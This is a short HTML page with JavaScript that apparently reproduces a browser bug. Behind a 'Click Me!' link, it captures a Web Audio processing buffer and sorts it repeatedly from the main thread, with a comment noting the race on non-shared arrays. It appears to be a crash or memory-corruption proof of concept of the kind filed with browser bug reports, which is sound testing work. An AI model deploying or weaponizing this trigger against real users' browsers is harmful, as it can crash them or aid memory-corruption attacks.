<html>
<body>
    <script type="text/javascript">
      function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms))
      }

      async function run() {
          let array = new Float32Array(Array(256));
          let context = new AudioContext();
          let node = context.createScriptProcessor();
          let source = context.createBufferSource();
          let buffer = context.createBuffer(1, 1024, context.sampleRate);
          let data = buffer.getChannelData(0);
          data.set(array);
          source.buffer = buffer;
          source.loop = true;
          source.connect(node);
          node.connect(context.destination);
          let inputBuffer = null;
          node.onaudioprocess = (event) => {
              inputBuffer = event.inputBuffer.getChannelData(0);
              node.onaudioprocess = undefined;
          }
          source.start();
          await sleep(500);
          for(let i = 0; i < 0x100000; ++i) {
            // not thread safe on non-shared arrays
            inputBuffer.sort()
          }
      }
    </script>
    <h1><a href="#" onclick="run()">Click Me!</a></h1>
    </body>
</html>
